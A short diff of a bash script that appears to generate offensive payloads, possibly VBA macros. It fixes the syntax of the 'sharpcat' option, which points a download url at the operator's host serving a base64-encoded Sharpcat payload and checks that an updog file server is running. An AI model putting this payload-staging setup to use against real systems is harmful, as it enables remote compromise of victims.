@@ -753,8 +753,9 @@ End Sub
 fi
 
 if [[ $5 == "sharpcat" ]] 
-    url="http://$IPv4/sc.enc" 
+    
 then
+    url="http://$IPv4/sc.enc" 
     if [ ! $(ps -ef | grep -c updog) == 2 ]
             then
                 yellowprint "You need to serve Sharpcat base64-encoded somewhere."
